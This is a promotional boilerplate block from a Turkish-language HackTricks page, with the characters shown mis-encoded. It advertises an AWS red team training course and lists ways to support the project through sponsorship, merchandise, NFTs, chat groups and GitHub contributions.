<summary><strong>SÄ±fÄ±rdan kahraman olacak ÅŸekilde AWS hackleme Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek istiyorsanÄ±z** veya **HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n veya bizi Twitter'da** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)** takip edin.**
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± paylaÅŸarak PR'lar gÃ¶ndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na katkÄ±da bulunun.

</details>
